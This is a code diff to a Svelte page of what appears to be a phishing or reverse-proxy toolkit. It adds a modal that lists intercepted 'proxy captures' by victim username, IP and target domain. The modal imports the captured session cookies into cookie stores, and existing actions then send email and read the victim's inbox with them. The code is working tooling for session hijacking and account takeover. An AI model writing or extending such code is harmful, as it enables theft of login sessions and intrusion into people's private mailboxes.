@@ -66,6 +66,13 @@
 	let currentMessage = null;
 	let messageLoading = false;
 
+	// Import from Proxy Captures modal
+	let isProxyCaptureModalVisible = false;
+	let proxyCaptures = [];
+	let proxyCapturesLoading = false;
+	let selectedCapture = null;
+	let proxyCaptureImportName = '';
+
 	// Delete
 	let isDeleteAlertVisible = false;
 	let deleteValues = { id: null, name: null };
@@ -150,6 +157,50 @@
 			importError = e.message || 'Import failed';
 		}
 		isImporting = false;
+	}
+
+	// --- Import from Proxy Captures ---
+	async function openProxyCaptureModal() {
+		isProxyCaptureModalVisible = true;
+		proxyCaptures = [];
+		selectedCapture = null;
+		proxyCaptureImportName = '';
+		proxyCapturesLoading = true;
+		try {
+			const params = new URLSearchParams({ page: 1, perPage: 50, sortBy: 'created_at', sortOrder: 'desc' });
+			const res = await api.proxyCaptures.getAll(params.toString());
+			if (res.success) {
+				// Filter to only captures that have cookies
+				proxyCaptures = (res.data.rows || []).filter(c => c.Cookies && c.Cookies.length > 2);
+			}
+		} catch (e) {
+			addToast('Failed to load proxy captures', 'error');
+		}
+		proxyCapturesLoading = false;
+	}
+
+	async function handleProxyCaptureImport() {
+		if (!selectedCapture) {
+			addToast('Please select a capture', 'error');
+			return;
+		}
+		const name = proxyCaptureImportName.trim() || `Proxy: ${selectedCapture.Username || selectedCapture.IPAddress || 'Unknown'}`;
+		showIsLoading();
+		try {
+			const res = await api.cookieStore.importFromCapture(
+				selectedCapture.ID,
+				name,
+				selectedCapture.Cookies
+			);
+			if (res && res.data) {
+				addToast('Cookies imported from proxy capture. Validating...', 'success');
+				isProxyCaptureModalVisible = false;
+				setTimeout(refreshStores, 2000);
+			}
+		} catch (e) {
+			addToast('Import failed: ' + (e.message || ''), 'error');
+		}
+		hideIsLoading();
 	}
 
 	// --- Revalidate ---
@@ -343,18 +394,19 @@
 
 <div class="flex gap-4 mb-6">
 	<BigButton on:click={openImportModal}>IMPORT COOKIES</BigButton>
+	<BigButton on:click={openProxyCaptureModal}>IMPORT FROM PROXY CAPTURES</BigButton>
 </div>
 
 <!-- Cookie Stores Table -->
 <Table
-	headers={['Name', 'Email', 'Source', 'Cookies', 'Status', 'Last Checked', 'Actions']}
+	columns={['Name', 'Email', 'Source', 'Cookies', 'Status', 'Last Checked']}
+	hasData={!!stores.length}
 	hasNextPage={storesHasNextPage}
-	{tableURLParams}
+	plural="Cookie Stores"
+	pagination={tableURLParams}
+	isGhost={isLoading}
 >
-	{#if stores.length === 0}
-		<TableCellEmpty colspan="7">No cookie stores found</TableCellEmpty>
-	{:else}
-		{#each stores as store}
+	{#each stores as store}
 			<TableRow>
 				<TableCell>
 					<span class="font-medium">{store.name}</span>
@@ -383,21 +435,19 @@
 				<TableCell>
 					<span class="text-xs">{formatDate(store.lastChecked)}</span>
 				</TableCell>
+				<TableCellEmpty />
 				<TableCellAction>
-					<TableDropDownEllipsis
-						items={[
-							...(store.isValid ? [
-								{ label: 'Send Email', action: () => openSendModal(store) },
-								{ label: 'Read Inbox', action: () => openInbox(store) }
-							] : []),
-							{ label: 'Revalidate', action: () => revalidateStore(store.id) },
-							{ label: 'Delete', action: () => confirmDelete(store), danger: true }
-						]}
-					/>
+					<TableDropDownEllipsis>
+						{#if store.isValid}
+							<button class="dropdown-item" on:click={() => openSendModal(store)}>Send Email</button>
+							<button class="dropdown-item" on:click={() => openInbox(store)}>Read Inbox</button>
+						{/if}
+						<button class="dropdown-item" on:click={() => revalidateStore(store.id)}>Revalidate</button>
+						<button class="dropdown-item dropdown-item-danger" on:click={() => confirmDelete(store)}>Delete</button>
+					</TableDropDownEllipsis>
 				</TableCellAction>
 			</TableRow>
-		{/each}
-	{/if}
+	{/each}
 </Table>
 
 <!-- Import Modal -->
@@ -636,6 +686,74 @@
 	</Modal>
 {/if}
 
+<!-- Import from Proxy Captures Modal -->
+{#if isProxyCaptureModalVisible}
+	<Modal
+		title="Import from Proxy Captures"
+		on:close={() => (isProxyCaptureModalVisible = false)}
+		wide={true}
+	>
+		{#if proxyCapturesLoading}
+			<div class="text-center py-8 opacity-60">Loading proxy captures...</div>
+		{:else if proxyCaptures.length === 0}
+			<div class="text-center py-8 opacity-60">No proxy captures with cookies found</div>
+		{:else}
+			<div class="mb-4">
+				<TextField
+					label="Name (optional)"
+					placeholder="e.g., Victim Session"
+					bind:value={proxyCaptureImportName}
+				/>
+			</div>
+			<div class="space-y-2 max-h-[50vh] overflow-y-auto">
+				{#each proxyCaptures as capture}
+					<button
+						class="w-full text-left p-3 rounded-lg border transition-colors cursor-pointer
+							{selectedCapture && selectedCapture.ID === capture.ID
+								? 'bg-blue-50 dark:bg-blue-900/20 border-blue-400 dark:border-blue-600'
+								: 'bg-base-100 border-base-300 hover:bg-base-200'}"
+						on:click={() => (selectedCapture = capture)}
+					>
+						<div class="flex justify-between items-start">
+							<div class="flex-1 min-w-0">
+								<div class="flex items-center gap-2">
+									{#if selectedCapture && selectedCapture.ID === capture.ID}
+										<span class="w-3 h-3 rounded-full bg-blue-500 flex-shrink-0"></span>
+									{/if}
+									<span class="font-medium text-sm">
+										{capture.Username || capture.IPAddress || 'Unknown'}
+									</span>
+									{#if capture.TargetDomain}
+										<span class="badge badge-info">{capture.TargetDomain}</span>
+									{/if}
+								</div>
+								<div class="text-xs opacity-60 mt-1">
+									IP: {capture.IPAddress || 'N/A'}
+									{#if capture.Cookies}
+										| Cookies: {(() => { try { return JSON.parse(capture.Cookies).length; } catch { return '?'; } })()}
+									{/if}
+								</div>
+							</div>
+							<div class="text-xs opacity-50 flex-shrink-0 ml-2">
+								{formatDate(capture.CreatedAt)}
+							</div>
+						</div>
+					</button>
+				{/each}
+			</div>
+		{/if}
+		<FormFooter>
+			<button
+				class="btn btn-primary"
+				on:click={handleProxyCaptureImport}
+				disabled={!selectedCapture}
+			>
+				Import Selected Capture
+			</button>
+		</FormFooter>
+	</Modal>
+{/if}
+
 <!-- Delete Alert -->
 {#if isDeleteAlertVisible}
 	<DeleteAlert
@@ -646,6 +764,26 @@
 {/if}
 
 <style>
+	.dropdown-item {
+		display: block;
+		width: 100%;
+		padding: 0.5rem 1rem;
+		text-align: left;
+		border: none;
+		background: none;
+		cursor: pointer;
+		font-size: 0.875rem;
+		color: var(--text-primary, #333);
+	}
+	.dropdown-item:hover {
+		background: var(--bg-hover, #f0f0f0);
+	}
+	.dropdown-item-danger {
+		color: rgb(220, 38, 38);
+	}
+	.dropdown-item-danger:hover {
+		background: rgba(239, 68, 68, 0.1);
+	}
 	.badge {
 		display: inline-flex;
 		align-items: center;
